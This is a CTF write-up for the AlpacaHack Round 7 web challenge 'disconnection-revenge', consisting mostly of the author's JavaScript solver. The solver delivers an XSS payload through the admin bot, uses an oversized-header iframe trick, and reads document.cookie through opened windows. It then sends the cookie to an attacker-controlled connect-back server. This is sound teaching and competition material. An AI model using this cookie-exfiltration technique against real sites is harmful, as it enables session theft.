---
title: "Disconnection Revenge - AlpacaHack Round 7 2024"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "disconnection", "revenge", "web", "alpacahack-round-7"]
summary: "This is a fixed challenge of disconnection."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/disconnection-revenge"
license: "none stated"
ctf:
  name: "AlpacaHack Round 7"
  year: 2024
  challenge: "Disconnection Revenge"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/disconnection-revenge>
- **CTF:** AlpacaHack Round 7 2024

---

# [web] disconnection-revenge

## Description

This is a fixed challenge of `disconnection`.

The password of the distributed file is the flag of `disconnection`.

## Attachments

- [disconnection-revenge](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_AlpacaHack_Round_7/web/disconnection-revenge/solution/index.js>

```javascript
const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const html = `
<body>
  <script>
    const ifr = document.createElement("iframe");
    ifr.src = "http://disconnection-revenge:3000/cookie?" + "x".repeat(20000); // 431 (Request Header Fields Too Large)
    document.body.appendChild(ifr);
  </script>
</body>
`.trim();
app.get("/", (req, reply) => reply.type("text/html").send(html));

const xss = `
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  (async () => {
    const win1 = open("${CONNECTBACK_URL}");
    while (true) {
      if (win1[0]) break;
      await sleep(500);
    }

    const win2 = win1[0].open("about:blank");
    while (true) {
      if (win2?.document?.cookie) break;
      await sleep(500);
    }

    location = "${CONNECTBACK_URL}/flag?" + win2.document.cookie;
  })();
`.trim();

app.get("/flag", async (req, reply) => {
  // You got a flag!
  console.log({ ...req.query });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(
    `http://disconnection-revenge:3000/?xss=${encodeURIComponent(xss)}`
  );

  await sleep(5 * 1000);
  fail("Failed");
});
```
